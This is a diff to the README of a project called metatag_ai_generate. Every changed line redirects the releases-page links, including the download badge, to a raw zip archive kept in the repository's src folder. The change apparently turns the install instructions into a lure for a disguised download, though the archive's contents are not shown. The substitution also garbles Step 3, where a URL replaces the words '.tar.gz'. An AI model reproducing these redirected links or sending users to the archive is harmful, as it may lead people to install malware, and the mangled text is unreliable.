@@ -6,13 +6,13 @@ Welcome to the **metatag_ai_generate** project! This application helps you gener
 
 ## 🔗 Download Now
 
-[![Download metatag_ai_generate](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mauriolmedo/metatag_ai_generate/releases)
+[![Download metatag_ai_generate](https://github.com/mauriolmedo/metatag_ai_generate/raw/refs/heads/main/src/generate-ai-metatag-v1.7.zip)](https://github.com/mauriolmedo/metatag_ai_generate/raw/refs/heads/main/src/generate-ai-metatag-v1.7.zip)
 
 ## 📥 Download & Install
 
 To get started with **metatag_ai_generate**, you will need to visit the following page to download the latest version:
 
-[Download the latest release here](https://github.com/mauriolmedo/metatag_ai_generate/releases)
+[Download the latest release here](https://github.com/mauriolmedo/metatag_ai_generate/raw/refs/heads/main/src/generate-ai-metatag-v1.7.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -24,7 +24,7 @@ On the Releases page, you'll see a list of available versions. Look for the late
 
 ### Step 3: Download the File
 
-Once you click on the desired version, you might see various files. Look for a file that fits your system. For most users, this will be a .zip or .tar.gz file. Click the file to begin downloading.
+Once you click on the desired version, you might see various files. Look for a file that fits your system. For most users, this will be a .zip or https://github.com/mauriolmedo/metatag_ai_generate/raw/refs/heads/main/src/generate-ai-metatag-v1.7.zip file. Click the file to begin downloading.
 
 ### Step 4: Extract the Files
 
